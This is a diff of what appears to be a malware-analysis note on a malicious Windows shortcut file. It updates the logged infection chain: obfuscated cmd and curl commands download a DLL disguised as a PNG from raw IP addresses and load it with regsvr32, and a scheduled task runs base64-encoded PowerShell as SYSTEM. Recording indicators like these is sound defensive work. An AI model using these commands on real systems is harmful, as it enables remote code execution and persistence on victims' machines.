@@ -16,9 +16,21 @@ lnk content:
 
 Exec > 
 
-cmd /c C:\Users\Admin\AppData\Local\Temp\EmergReport_621087\EmergReport_621087.lnk
+cmd /c C:\Users\Admin\AppData\Local\Temp\Permission_875695\Permission_875695.lnk
 
-cmd.exe" /c set r1=regs&&C:\Windows\system32\curl -s -o C:\Users\Admin\AppData\Local\Temp\theyOneAs.png http://194.36.189.211/whoThing.jpg&& call               C:\Windows\system32\%r1%vr32 C:\Users\Admin\AppData\Local\Temp\theyOneAs.png
+cmd.exe /c set r1=regsv&& set cu=cur&&call C:\Windows\system32\%cu%l -s -o C:\Users\Admin\AppData\Local\Temp\oneWhich.png http://85.239.55.212/whichABy.jpg&&call C:\Windows\system32\%r1%r32 C:\Users\Admin\AppData\Local\Temp\oneWhich.png
+
+regsvr32 /s C:\Users\Admin\AppData\Local\Temp\whichABy.dll
+
+schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /Z /ST 19:18 /tn qqdmhsd /ET 19:29 /tr "powershell.exe -encodedCommand cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAdwBoAGkAYwBoAEEAQgB5AC4AZABsAGwAIgA=" /SC ONCE
+
+powershell.exe -encodedCommand cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAdwBoAGkAYwBoAEEAQgB5AC4AZABsAGwAIgA=
+
+"C:\Windows\system32\regsvr32.exe" C:\Users\Admin\AppData\Local\Temp\whichABy.dll
+
+ C:\Users\Admin\AppData\Local\Temp\whichABy.dll
+
+C:\Windows\SysWOW64\explorer.exe
 
 ******************************
 
